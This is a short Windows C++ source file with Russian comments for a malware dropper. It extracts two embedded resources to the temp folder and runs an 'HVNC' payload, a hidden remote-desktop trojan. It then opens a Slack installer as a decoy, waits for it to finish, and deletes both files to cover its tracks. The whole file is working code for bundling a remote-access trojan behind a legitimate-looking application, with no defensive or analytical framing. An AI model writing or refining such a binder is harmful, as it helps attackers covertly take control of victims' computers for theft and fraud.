#include <windows.h>
#include <string>

// ID иконки
#define IDI_MAIN 100

// Функция извлечения ресурса
bool ExtractResource(int id, const std::string& path) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(id), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    DWORD size = SizeofResource(NULL, hRes);
    void* data = LockResource(hData);
    
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written;
    WriteFile(hFile, data, size, &written, NULL);
    CloseHandle(hFile);
    return true;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    
    std::string zoom = std::string(tmp) + "slack.tmp";
    std::string hvnc = std::string(tmp) + "svc.tmp";
    
    // Извлекаем из ресурсов
    ExtractResource(101, zoom);
    ExtractResource(102, hvnc);
    
    // Запускаем HVNC (НЕ скрыто)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi1, pi2;
    CreateProcessA(hvnc.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi1);
    CloseHandle(pi1.hProcess);
    CloseHandle(pi1.hThread);
    
    // Запускаем Slack
    CreateProcessA(zoom.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi2);
    WaitForSingleObject(pi2.hProcess, INFINITE);
    CloseHandle(pi2.hProcess);
    CloseHandle(pi2.hThread);
    
    // Чистим
    DeleteFileA(zoom.c_str());
    DeleteFileA(hvnc.c_str());
    
    return 0;
}
